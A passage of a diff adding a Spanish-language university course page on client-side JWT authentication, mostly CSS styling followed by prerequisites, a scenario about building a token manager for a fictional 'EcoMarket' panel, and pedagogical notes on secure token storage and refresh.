@@ -1,0 +1,1915 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Semana 8: Autenticación JWT desde el Cliente | AETL</title>
+    <style>
+:root {
+    --primary: #003a63;
+    --secondary: #005b96;
+    --accent: #f2a900;
+    --success: #28a745;
+    --warning: #ffc107;
+    --danger: #dc3545;
+    --info: #17a2b8;
+    --light: #f8f9fa;
+    --dark: #343a40;
+    --gray: #6c757d;
+    --border-radius: 8px;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    line-height: 1.7; color: var(--dark);
+    background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ec 100%);
+    min-height: 100vh;
+}
+/* ── HEADER ───────────────────────────────────────── */
+.header-institucional {
+    background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+    color: white; padding: 2rem; text-align: center;
+    box-shadow: 0 4px 20px rgba(0,58,99,0.3);
+}
+.header-institucional .logo-container {
+    display: flex; justify-content: center; align-items: center;
+    gap: 2rem; margin-bottom: 1rem; flex-wrap: wrap;
+}
+.header-institucional .escudo {
+    width: 80px; height: 80px; background: white; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: bold; color: var(--primary); font-size: 1.2rem;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+}
+.header-institucional h1 { font-size: 1.8rem; margin-bottom: 0.5rem; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
+.header-institucional .subtitulo { font-size: 1.1rem; opacity: 0.9; }
+.header-institucional .badge-semana {
+    display: inline-block; background: var(--accent); color: var(--primary);
+    padding: 0.5rem 1.5rem; border-radius: 25px; font-weight: bold;
+    margin-top: 1rem; font-size: 1rem;
+}
+/* ── PROGRESS BAR ─────────────────────────────────── */
+.progress-container {
+    background: white; padding: 1rem 2rem;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    position: sticky; top: 0; z-index: 100;
+}
+.progress-bar {
+    display: flex; justify-content: space-between; align-items: center;
+    max-width: 900px; margin: 0 auto; position: relative;
+}
+.progress-bar::before {
+    content: ''; position: absolute; top: 50%; left: 0; right: 0;
+    height: 4px; background: #e0e0e0; transform: translateY(-50%); z-index: 1;
+}
+.progress-step {
+    display: flex; flex-direction: column; align-items: center;
+    position: relative; z-index: 2; cursor: pointer;
+    transition: transform 0.3s; text-decoration: none;
+}
+.progress-step:hover { transform: scale(1.1); }
+.progress-step .step-icon {
+    width: 45px; height: 45px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.2rem; background: white; border: 3px solid #e0e0e0;
+    transition: all 0.3s;
+}
+.progress-step.active .step-icon {
+    background: var(--secondary); border-color: var(--secondary);
+    color: white; box-shadow: 0 4px 15px rgba(0,91,150,0.4);
+}
+.progress-step.completed .step-icon {
+    background: var(--success); border-color: var(--success); color: white;
+}
+.progress-step .step-label {
+    font-size: 0.75rem; margin-top: 0.5rem; color: var(--gray);
+    font-weight: 600; text-transform: uppercase;
+}
+.progress-step.active .step-label { color: var(--secondary); }
+/* ── NAV ──────────────────────────────────────────── */
+.nav-container {
+    background: var(--primary); padding: 0.8rem 2rem;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+}
+.nav-links {
+    display: flex; justify-content: center; gap: 0.5rem;
+    flex-wrap: wrap; max-width: 1200px; margin: 0 auto;
+}
+.nav-links a {
+    color: white; text-decoration: none; padding: 0.5rem 1rem;
+    border-radius: 20px; font-size: 0.9rem; transition: all 0.3s;
+    border: 1px solid transparent;
+}
+.nav-links a:hover { background: rgba(255,255,255,0.15); border-color: var(--accent); }
+/* ── LAYOUT ───────────────────────────────────────── */
+.container { max-width: 1100px; margin: 0 auto; padding: 2rem; }
+/* ── FASE SECTIONS ────────────────────────────────── */
+.fase-section {
+    background: white; border-radius: var(--border-radius);
+    margin-bottom: 2rem; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    overflow: hidden; animation: fadeIn 0.5s ease-out;
+}
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.fase-header { padding: 1.5rem 2rem; color: white; display: flex; align-items: center; gap: 1rem; }
+.fase-header.comprende { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+.fase-header.aplica    { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); }
+.fase-header.reflexiona{ background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); }
+.fase-header.valida    { background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%); }
+.fase-header.profundiza{ background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); }
+.fase-header .fase-icon {
+    font-size: 2rem; width: 60px; height: 60px;
+    background: rgba(255,255,255,0.2); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+}
+.fase-header .fase-info h2 { font-size: 1.5rem; margin-bottom: 0.3rem; }
+.fase-header .fase-info .bloom-tag { font-size: 0.85rem; opacity: 0.9; font-weight: 500; }
+.fase-content { padding: 2rem; }
+/* ── SHARED COMPONENTS ────────────────────────────── */
+.objetivos-box {
+    background: linear-gradient(135deg, #e8f4fd 0%, #d1e8fa 100%);
+    border-left: 4px solid var(--secondary); padding: 1.5rem;
+    border-radius: 0 var(--border-radius) var(--border-radius) 0; margin-bottom: 1.5rem;
+}
+.objetivos-box h4 { color: var(--primary); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.objetivos-box ul { list-style: none; padding-left: 0; }
+.objetivos-box li { padding: 0.5rem 0; padding-left: 1.5rem; position: relative; }
+.objetivos-box li::before { content: '🎯'; position: absolute; left: 0; }
+.context-box { padding: 1.2rem 1.5rem; border-radius: var(--border-radius); margin: 1.5rem 0; border-left: 4px solid; }
+.context-box.tip     { background: linear-gradient(135deg, #e3f9e5 0%, #c8f7dc 100%); border-color: var(--success); }
+.context-box.warning { background: linear-gradient(135deg, #fff8e1 0%, #ffecb3 100%); border-color: var(--warning); }
+.context-box.danger  { background: linear-gradient(135deg, #ffebee 0%, #ffcdd2 100%); border-color: var(--danger); }
+.context-box.info    { background: linear-gradient(135deg, #e1f5fe 0%, #b3e5fc 100%); border-color: var(--info); }
+.context-box.purple  { background: linear-gradient(135deg, #f3e8ff 0%, #e8d5f5 100%); border-color: #6f42c1; }
+.context-box .box-title { font-weight: bold; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
+.reto-ia {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    color: white; border-radius: var(--border-radius); margin: 1.5rem 0;
+    overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+}
+.reto-ia-header {
+    background: linear-gradient(90deg, var(--accent) 0%, #e89900 100%);
+    color: var(--primary); padding: 1rem 1.5rem;
+    display: flex; align-items: center; gap: 1rem;
+}
+.reto-ia-header .reto-numero {
+    background: var(--primary); color: var(--accent);
+    width: 40px; height: 40px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: bold; font-size: 1.1rem;
+}
+.reto-ia-header h4 { flex: 1; font-size: 1.1rem; }
+.reto-ia-body { padding: 1.5rem; }
+.reto-ia .rol-ia {
+    background: rgba(242,169,0,0.15); border: 1px solid var(--accent);
+    padding: 0.8rem 1rem; border-radius: var(--border-radius);
+    margin-bottom: 1rem; font-size: 0.9rem;
+}
+.reto-ia .rol-ia strong { color: var(--accent); }
+.prompt-box {
+    background: #0d1117; border: 1px solid #30363d;
+    border-radius: var(--border-radius); padding: 1.2rem; margin: 1rem 0;
+    font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9rem;
+    line-height: 1.6; white-space: pre-wrap; color: #c9d1d9;
+}
+.prompt-box::before {
+    content: '📝 PROMPT'; display: block; color: var(--accent);
+    font-weight: bold; margin-bottom: 0.8rem; font-family: 'Segoe UI', sans-serif;
+}
+.entregable-box {
+    background: rgba(40,167,69,0.15); border: 1px dashed var(--success);
+    padding: 1rem; border-radius: var(--border-radius); margin-top: 1rem;
+}
+.entregable-box::before {
+    content: '📦 ENTREGABLE ESPERADO'; display: block; color: var(--success);
+    font-weight: bold; margin-bottom: 0.5rem;
+}
+.checkpoint {
+    background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+    border-radius: var(--border-radius); padding: 1.5rem; margin: 1.5rem 0;
+}
+.checkpoint h4 { color: var(--primary); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.checkpoint .pregunta {
+    background: white; padding: 1rem; border-radius: var(--border-radius);
+    margin: 0.8rem 0; box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    position: relative; padding-left: 3rem;
+}
+.checkpoint .pregunta::before { content: '❓'; position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
+.ascii-diagram {
+    background: #1e1e1e; color: #00ff00;
+    font-family: 'Consolas', 'Monaco', monospace; padding: 1.5rem;
+    border-radius: var(--border-radius); overflow-x: auto;
+    margin: 1.5rem 0; font-size: 0.85rem; line-height: 1.4; white-space: pre;
+}
+.diagrama-descripcion {
+    background: #f8f9fa; border-left: 4px solid var(--info);
+    padding: 1rem; margin-top: -1rem; margin-bottom: 1.5rem;
+    font-size: 0.9rem; color: var(--dark);
+}
+.escenario-inmersivo {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    color: white; padding: 2rem; border-radius: var(--border-radius);
+    margin-bottom: 2rem; position: relative; overflow: hidden;
+}
+.escenario-inmersivo::before {
+    content: ''; position: absolute; top: 0; right: 0;
+    width: 200px; height: 200px;
+    background: radial-gradient(circle, var(--accent) 0%, transparent 70%); opacity: 0.1;
+}
+.escenario-inmersivo h3 { color: var(--accent); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.escenario-inmersivo .personaje {
+    background: rgba(255,255,255,0.1); padding: 1rem;
+    border-radius: var(--border-radius); margin: 1rem 0;
+    border-left: 3px solid var(--accent);
+}
+.escenario-inmersivo .dialogo {
+    font-style: italic; margin: 1rem 0; padding-left: 1rem;
+    border-left: 2px solid rgba(255,255,255,0.3);
+}
+.fundamentos-section {
+    background: white; border-radius: var(--border-radius);
+    margin-bottom: 2rem; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;
+}
+.fundamentos-header {
+    background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+    color: white; padding: 1.5rem 2rem;
+}
+.constructo-card {
+    border: 1px solid #e0e0e0; border-radius: var(--border-radius);
+    margin: 1rem; overflow: hidden; transition: all 0.3s;
+}
+.constructo-card:hover { box-shadow: 0 8px 25px rgba(0,0,0,0.1); transform: translateY(-2px); }
+.constructo-card .card-header { padding: 1rem 1.5rem; font-weight: bold; display: flex; align-items: center; gap: 0.8rem; }
+.constructo-card:nth-child(1) .card-header { background: #e8f4fd; color: var(--primary); }
+.constructo-card:nth-child(2) .card-header { background: #fff3e0; color: #e65100; }
+.constructo-card:nth-child(3) .card-header { background: #e8f5e9; color: #2e7d32; }
+.constructo-card:nth-child(4) .card-header { background: #f3e5f5; color: #7b1fa2; }
+.constructo-card:nth-child(5) .card-header { background: #fce4ec; color: #c2185b; }
+.constructo-card .card-body { padding: 1.5rem; font-size: 0.95rem; }
+.constructo-card .referencia { font-size: 0.85rem; color: var(--gray); margin-bottom: 0.8rem; }
+.constructo-card .operacional {
+    background: #f8f9fa; padding: 0.8rem; border-radius: var(--border-radius);
+    margin-top: 1rem; font-size: 0.9rem; border-left: 3px solid var(--accent);
+}
+.invariantes-box {
+    background: linear-gradient(135deg, #fce4ec 0%, #f8bbd9 100%);
+    border: 2px dashed #c2185b; border-radius: var(--border-radius);
+    padding: 1.5rem; margin-top: 2rem;
+}
+.invariantes-box h4 { color: #880e4f; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.invariantes-box ul { margin-left: 1.5rem; }
+.invariantes-box li { margin-bottom: 0.6rem; }
+.errores-comunes {
+    background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
+    border: 2px solid var(--warning); border-radius: var(--border-radius);
+    padding: 1.5rem; margin: 1.5rem 0;
+}
+.errores-comunes h4 { color: #e65100; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.error-item { background: white; padding: 1rem; border-radius: var(--border-radius); margin: 0.8rem 0; border-left: 4px solid var(--warning); }
+.error-item strong { color: #e65100; }
+.reto-badge { display: inline-block; padding: 0.25rem 0.75rem; border-radius: 15px; font-size: 0.75rem; font-weight: bold; text-transform: uppercase; margin-left: 0.5rem; }
+.reto-badge.esencial { background: var(--success); color: white; }
+.reto-badge.avanzado { background: linear-gradient(135deg, #9c27b0 0%, #673ab7 100%); color: white; }
+.prerrequisitos-box { background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%); border: 2px solid var(--accent); border-radius: var(--border-radius); padding: 1.5rem; margin-bottom: 2rem; }
+.prerrequisitos-box h4 { color: var(--primary); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.prerrequisitos-box ul { margin-left: 1.5rem; }
+.prerrequisitos-box li { margin-bottom: 0.5rem; }
+.conexion-semana-anterior { background: linear-gradient(135deg, #e8f4fd 0%, #bbdefb 100%); border-left: 4px solid var(--secondary); padding: 1.2rem 1.5rem; border-radius: 0 var(--border-radius) var(--border-radius) 0; margin-bottom: 1.5rem; }
+.conexion-semana-anterior h4 { color: var(--primary); margin-bottom: 0.8rem; display: flex; align-items: center; gap: 0.5rem; }
+.tabla-comparativa { width: 100%; border-collapse: collapse; margin: 1.5rem 0; background: white; border-radius: var(--border-radius); overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+.tabla-comparativa th { background: var(--primary); color: white; padding: 1rem; text-align: left; }
+.tabla-comparativa td { padding: 0.8rem 1rem; border-bottom: 1px solid #e0e0e0; }
+.tabla-comparativa tr:last-child td { border-bottom: none; }
+.tabla-comparativa tr:hover { background: #f8f9fa; }
+.glosario-section { background: white; border-radius: var(--border-radius); box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; margin-bottom: 2rem; }
+.glosario-header { background: var(--dark); color: white; padding: 1.5rem 2rem; }
+.glosario-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; padding: 1.5rem; }
+.termino-card { background: #f8f9fa; padding: 1rem; border-radius: var(--border-radius); border-left: 4px solid var(--secondary); }
+.termino-card.aetl { border-left-color: var(--accent); }
+.termino-card dt { font-weight: bold; color: var(--primary); margin-bottom: 0.5rem; }
+.termino-card dd { font-size: 0.9rem; color: var(--gray); }
+.evaluacion-section { background: white; border-radius: var(--border-radius); box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; margin-bottom: 2rem; }
+.evaluacion-header { background: linear-gradient(135deg, var(--success) 0%, #20c997 100%); color: white; padding: 1.5rem 2rem; }
+.criterio-item { display: flex; align-items: center; padding: 1rem 1.5rem; border-bottom: 1px solid #e0e0e0; }
+.criterio-item:last-child { border-bottom: none; }
+.criterio-item .fase-badge { background: var(--secondary); color: white; padding: 0.3rem 0.8rem; border-radius: 15px; font-size: 0.8rem; margin-right: 1rem; min-width: 100px; text-align: center; }
+.criterio-item .puntos { background: var(--accent); color: var(--primary); padding: 0.5rem 1rem; border-radius: var(--border-radius); font-weight: bold; margin-left: auto; }
+.referencias-section { background: white; border-radius: var(--border-radius); box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 2rem; margin-bottom: 2rem; }
+.referencias-section h3 { color: var(--primary); margin-bottom: 1.5rem; padding-bottom: 0.5rem; border-bottom: 2px solid var(--accent); }
+.referencia-item { padding: 0.8rem 0; border-bottom: 1px dashed #e0e0e0; font-size: 0.95rem; }
+.referencia-item:last-child { border-bottom: none; }
+code { background: #f1f3f4; padding: 0.2rem 0.5rem; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.9em; color: #d63384; }
+pre code { display: block; padding: 1rem; background: #1e1e1e; color: #d4d4d4; overflow-x: auto; }
+.footer { background: var(--primary); color: white; text-align: center; padding: 2rem; margin-top: 2rem; }
+.footer .modelo-badge { display: inline-block; background: var(--accent); color: var(--primary); padding: 0.5rem 1.5rem; border-radius: 25px; font-weight: bold; margin-bottom: 1rem; }
+.checklist-box { background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%); border: 2px solid var(--success); border-radius: var(--border-radius); padding: 1.5rem; margin: 1.5rem 0; }
+.checklist-box h4 { color: #1b5e20; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+.checklist-item { background: white; padding: 0.8rem 1rem; border-radius: var(--border-radius); margin: 0.6rem 0; display: flex; align-items: flex-start; gap: 0.8rem; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
+.checklist-item .check-icon { font-size: 1.1rem; min-width: 24px; }
+.checklist-item .diagnostico { font-size: 0.85rem; color: var(--gray); margin-top: 0.3rem; font-style: italic; }
+/* ── ENTREGABLE ÚNICO BOX ─────────────────────────── */
+.entregable-unico-box {
+    background: linear-gradient(135deg, #003a63 0%, #005b96 100%);
+    color: white; border-radius: var(--border-radius); padding: 1.5rem 2rem;
+    margin: 1.5rem 0; box-shadow: 0 4px 20px rgba(0,58,99,0.25);
+}
+.entregable-unico-box h4 { color: var(--accent); margin-bottom: 1rem; }
+.entregable-unico-box ul { margin-left: 1.5rem; }
+.entregable-unico-box li { margin-bottom: 0.5rem; opacity: 0.92; }
+/* ── RUTA SECTIONS ────────────────────────────────── */
+.ruta-tabs { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
+.ruta-tab {
+    padding: 0.5rem 1.2rem; border-radius: 20px; border: none; cursor: pointer;
+    font-size: 0.9rem; font-weight: 600; transition: all 0.3s;
+}
+.ruta-tab.python { background: #3776ab; color: white; }
+.ruta-tab.python:hover { background: #2a5f8a; }
+.ruta-tab.browser { background: #f7df1e; color: #333; }
+.ruta-tab.browser:hover { background: #e0c900; }
+.ruta-content { display: none; }
+.ruta-content.active { display: block; }
+.ruta-content pre code { border-radius: var(--border-radius); line-height: 1.6; }
+/* ── JWT VISUAL ──────────────────────────────────── */
+.jwt-visual {
+    display: flex; gap: 0.3rem; align-items: stretch;
+    margin: 1.5rem 0; flex-wrap: wrap;
+}
+.jwt-part {
+    flex: 1; min-width: 180px; border-radius: var(--border-radius);
+    padding: 1rem; text-align: center;
+}
+.jwt-part.header-part { background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; }
+.jwt-part.payload-part { background: linear-gradient(135deg, #8e44ad 0%, #6c3483 100%); color: white; }
+.jwt-part.signature-part { background: linear-gradient(135deg, #2980b9 0%, #1a5276 100%); color: white; }
+.jwt-part .part-label { font-size: 0.75rem; text-transform: uppercase; opacity: 0.8; margin-bottom: 0.5rem; }
+.jwt-part .part-title { font-size: 1.1rem; font-weight: bold; margin-bottom: 0.5rem; }
+.jwt-part .part-content { font-size: 0.8rem; font-family: monospace; opacity: 0.9; word-break: break-all; }
+.jwt-separator { display: flex; align-items: center; font-size: 1.5rem; font-weight: bold; color: var(--accent); padding: 0 0.2rem; }
+.contenido-section h3 { color: var(--primary); margin: 1.5rem 0 1rem; border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; }
+.contenido-section p { margin-bottom: 1rem; }
+.contenido-section ul, .contenido-section ol { margin-left: 1.5rem; margin-bottom: 1rem; }
+.contenido-section li { margin-bottom: 0.4rem; }
+@media print {
+    .progress-container, .nav-container { position: static; }
+    .fase-section { break-inside: avoid; }
+}
+    </style>
+</head>
+<body>
+
+<!-- ========== HEADER INSTITUCIONAL ========== -->
+<header class="header-institucional">
+    <div class="logo-container">
+        <div class="escudo">UAN</div>
+        <div>
+            <h1>Programación Distribuida del Lado del Cliente</h1>
+            <p class="subtitulo">Licenciatura en Sistemas Computacionales</p>
+        </div>
+        <div class="escudo">LSC</div>
+    </div>
+    <span class="badge-semana">📅 Semana 8 de 15 · Unidad III: Seguridad del Cliente · Autenticación JWT</span>
+</header>
+
+<!-- ========== BARRA DE PROGRESO ========== -->
+<div class="progress-container">
+    <div class="progress-bar">
+        <a href="#comprende" class="progress-step active">
+            <div class="step-icon">📖</div>
+            <span class="step-label">Comprende</span>
+        </a>
+        <a href="#aplica" class="progress-step">
+            <div class="step-icon">⚡</div>
+            <span class="step-label">Aplica</span>
+        </a>
+        <a href="#reflexiona" class="progress-step">
+            <div class="step-icon">🔍</div>
+            <span class="step-label">Reflexiona</span>
+        </a>
+        <a href="#valida" class="progress-step">
+            <div class="step-icon">✔</div>
+            <span class="step-label">Valida</span>
+        </a>
+        <a href="#profundiza" class="progress-step">
+            <div class="step-icon">🚀</div>
+            <span class="step-label">Profundiza</span>
+        </a>
+    </div>
+</div>
+
+<!-- ========== NAVEGACIÓN ========== -->
+<nav class="nav-container">
+    <div class="nav-links">
+        <a href="#prereq">📋 Prerrequisitos</a>
+        <a href="#escenario">🏢 Escenario</a>
+        <a href="#fundamentos">🧠 Fundamentos</a>
+        <a href="#comprende">📖 Comprende</a>
+        <a href="#aplica">⚡ Aplica</a>
+        <a href="#reflexiona">🔍 Reflexiona</a>
+        <a href="#valida">✔ Valida</a>
+        <a href="#profundiza">🚀 Profundiza</a>
+        <a href="#evaluacion">📊 Evaluación</a>
+        <a href="#glosario">📖 Glosario</a>
+        <a href="#referencias">📚 Referencias</a>
+    </div>
+</nav>
+
+<main class="container">
+
+    <!-- ========== PRERREQUISITOS ========== -->
+    <section id="prereq" class="prerrequisitos-box">
+        <h4>📋 Para tener éxito esta semana, asegúrate de dominar...</h4>
+        <ul>
+            <li><strong>HTTP request/response básico (Semanas 1–3):</strong> cómo tu cliente construye peticiones, agrega headers y lee respuestas. Esta semana añades el header <code>Authorization: Bearer &lt;token&gt;</code> a cada petición autenticada.</li>
+            <li><strong>Manejo de errores HTTP desde el cliente (Semana 2):</strong> tu cliente debe distinguir <code>401 Unauthorized</code> (token expirado o inválido) de <code>403 Forbidden</code> (token válido pero sin permisos). Son respuestas diferentes con acciones distintas.</li>
+            <li><strong>async/await en tu lenguaje elegido (Semana 3):</strong> el refresh de tokens ocurre de forma asíncrona y puede bloquear otras peticiones concurrentes mientras se completa. Si aún tienes dudas con async/await, repásalas antes de continuar.</li>
+            <li><strong>Patrón Observer (Semana 4):</strong> el estado de autenticación (autenticado / expirado / renovando) puede notificarse a múltiples componentes de la UI usando Observer. No es obligatorio reimplementarlo, pero sí entenderlo.</li>
+            <li><strong>Codificación Base64:</strong> el JWT usa Base64URL (variante de Base64 con <code>-</code> en vez de <code>+</code> y <code>_</code> en vez de <code>/</code>, sin padding <code>=</code>). Tu cliente decodifica el payload para leer el claim <code>exp</code> — sin necesidad de librería especial.</li>
+        </ul>
+        <div class="context-box warning" style="margin-top: 1rem; margin-bottom: 0;">
+            <div class="box-title">⚠️ Perspectiva cliente — no implementarás el servidor JWT</div>
+            <p>El servidor de EcoMarket ya genera y valida los JWTs. Tu trabajo esta semana es exclusivamente del lado del <strong>cliente</strong>: recibir tokens, leerlos, almacenarlos de forma segura, adjuntarlos a peticiones y gestionarlos durante todo su ciclo de vida. No implementarás HMAC, RSA ni ninguna función de firma.</p>
+        </div>
+    </section>
+
+    <!-- ========== CONEXIÓN CON SEMANA ANTERIOR ========== -->
+    <div class="conexion-semana-anterior">
+        <h4>🔗 Semana 7 → Semana 8: ¿Qué extiende este documento?</h4>
+        <p>La semana pasada construiste un <strong>ClienteSSEMultiplex</strong> que recibe eventos en tiempo real de EcoMarket sobre una sola conexión HTTP persistente. Ahora EcoMarket exige que ese panel — y todas las peticiones a su API — estén <strong>autenticados</strong>. Cada vez que tu cliente abre una conexión SSE, hace un fetch de inventario o solicita precios, debe adjuntar un token JWT válido. Si el token expira mientras la conexión SSE está activa, el cliente debe renovarlo silenciosamente sin cortar el flujo de eventos. Autenticación y comunicación en tiempo real se combinan esta semana.</p>
+    </div>
+
+    <!-- ========== ESCENARIO INMERSIVO ========== -->
+    <section id="escenario">
+        <div class="escenario-inmersivo">
+            <h3>🏢 Escenario: EcoMarket — El Panel Ahora Tiene Portero</h3>
+            <p>TechNova acaba de recibir un correo del CTO de EcoMarket con asunto urgente: <em>"El panel de control que construyeron es impresionante, pero cualquiera con la URL puede verlo. Necesitamos autenticación antes del lunes."</em></p>
+            <p style="margin-top: 0.8rem; opacity: 0.9;">El equipo de backend ya configuró el servidor para emitir JWTs de corta duración (<strong>access_token</strong>, 15 minutos) y de larga duración (<strong>refresh_token</strong>, 7 días). Tu misión como equipo cliente: implementar el <strong>TokenManager</strong> que gestione el ciclo de vida completo de esos tokens sin interrumpir la experiencia del operador.</p>
+            <div class="personaje">
+                <strong>🧑‍💻 Dev Junior (equipo TechNova):</strong>
+                <div class="dialogo">"Fácil: guardo el token en localStorage y lo leo cuando lo necesito. Listo."</div>
+            </div>
+            <div class="personaje">
+                <strong>👩‍🏫 Arquitecta Senior (TechNova):</strong>
+                <div class="dialogo">"¿Y cuando el token expire en 15 minutos mientras el operador está viendo el panel? ¿Y si 5 peticiones concurrentes reciben 401 simultáneamente, todas intentan hacer refresh al mismo tiempo y el servidor invalida los refresh tokens por uso múltiple? Además, localStorage es accesible desde cualquier script en la página — un XSS y el atacante se lleva todos los tokens. Necesitamos un TokenManager que resuelva esos tres problemas."</div>
+            </div>
+            <div class="personaje">
+                <strong>🧑‍💻 Dev Junior:</strong>
+                <div class="dialogo">"No sabía que había que manejar todo eso... ¿Por dónde empiezo?"</div>
+            </div>
+            <div class="personaje">
+                <strong>👩‍🏫 Arquitecta Senior:</strong>
+                <div class="dialogo">"Primero, entiende qué hay dentro del token — tu cliente puede leer el claim <code>exp</code> para anticiparse a la expiración, no solo reaccionar cuando ya expiró. Segundo, el refresh debe ser una operación <em>singleton</em>: si ya hay un refresh en curso, las demás peticiones esperan su resultado en lugar de disparar otro. Tercero, elegimos dónde almacenar con criterio de seguridad, no de conveniencia."</div>
+            </div>
+            <p style="margin-top: 1rem; opacity: 0.85;"><em>Tu misión esta semana: construir el <strong>TokenManager</strong> que gestiona access y refresh tokens, anticipa la expiración leyendo el claim <code>exp</code>, ejecuta refresh singleton y adjunta el token a cada petición — todo desde la perspectiva del cliente.</em></p>
+        </div>
+    </section>
+
+    <!-- ========== FUNDAMENTOS TEÓRICOS ========== -->
+    <section id="fundamentos" class="fundamentos-section">
+        <div class="fundamentos-header">
+            <h2>🧠 Fundamentos Teóricos — Marco Pedagógico AETL</h2>
+            <p style="opacity: 0.9; margin-top: 0.5rem;">Constructos que guían cómo aprendes esta semana</p>
+        </div>
+        <div style="padding: 1.5rem; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem;">
+            <div class="constructo-card">
+                <div class="card-header">🏗️ Constructivismo y ZDP</div>
+                <div class="card-body">
+                    <div class="referencia">Vygotsky (1978); Bognár (2024)</div>
+                    <p>La IA actúa como andamiaje en tu Zona de Desarrollo Próximo: te ayuda a leer el payload del JWT o a estructurar el TokenManager, pero tú decides el diseño de la clase, los métodos y la estrategia de almacenamiento.</p>
+                    <div class="operacional">🔧 <strong>Operacional:</strong> Cuando la IA genere código del TokenManager, identifica cada decisión de diseño (nombres de métodos, tipos de excepción, estrategia de almacenamiento) y justifícala en tu bitácora.</div>
+                </div>
+            </div>
+            <div class="constructo-card">
+                <div class="card-header">📋 Aprendizaje Autorregulado (SRL)</div>
+                <div class="card-body">
+                    <div class="referencia">Zimmerman (2000); Chiu (2024)</div>
+                    <p>El ciclo planificación → ejecución → autorreflexión es especialmente importante en seguridad: un error en el manejo de tokens tiene consecuencias reales. Antes de implementar, planifica explícitamente qué pasa cuando el refresh falla.</p>
+                    <div class="operacional">🔧 <strong>Operacional:</strong> Antes de escribir código, escribe en papel o en texto el diagrama de estados de tu TokenManager (sin token → autenticando → autenticado → renovando → error).</div>
+                </div>
+            </div>
+            <div class="constructo-card">
+                <div class="card-header">⚙️ Teoría de Carga Cognitiva</div>
+                <div class="card-body">
+                    <div class="referencia">Sweller (1988/2020); Mahdi et al. (2025)</div>
+                    <p>La seguridad tiene muchos conceptos interrelacionados (firma, claims, expiración, almacenamiento, refresh, XSS). Esta semana reduce la carga intrínseca: el servidor ya maneja la firma — tú solo gestionas el ciclo de vida del token ya recibido.</p>
+                    <div class="operacional">🔧 <strong>Operacional:</strong> Si sientes sobrecarga, separa el problema: primero logra hacer login y adjuntar el token. Después agrega el refresh. Finalmente añade la estrategia de almacenamiento seguro.</div>
+                </div>
+            </div>
+            <div class="constructo-card">
+                <div class="card-header">🤝 Agencia Compartida</div>
+                <div class="card-body">
+                    <div class="referencia">Bandura (2001); Brod et al. (2023)</div>
+                    <p>En seguridad, la IA puede generar código que parece correcto pero tiene vulnerabilidades sutiles (ej: almacenar el token en una variable global accesible, o no manejar el caso de refresh token expirado). El estudiante es el auditor de seguridad.</p>
+                    <div class="operacional">🔧 <strong>Operacional:</strong> Después de cada reto, pregúntate: "¿Qué escenario de ataque no cubre este código?" antes de darlo por bueno.</div>
+                </div>
+            </div>
+            <div class="constructo-card">
+                <div class="card-header">🎓 Taxonomía de Bloom</div>
+                <div class="card-body">
+                    <div class="referencia">Anderson et al. (2001)</div>
+                    <p>Esta semana progresamos de <strong>Recordar</strong> (qué claims tiene un JWT) → <strong>Analizar</strong> (comparar estrategias de almacenamiento) → <strong>Evaluar</strong> (auditar la implementación contra ataques XSS/CSRF) → <strong>Crear</strong> (diseñar el TokenManager con refresh singleton).</p>
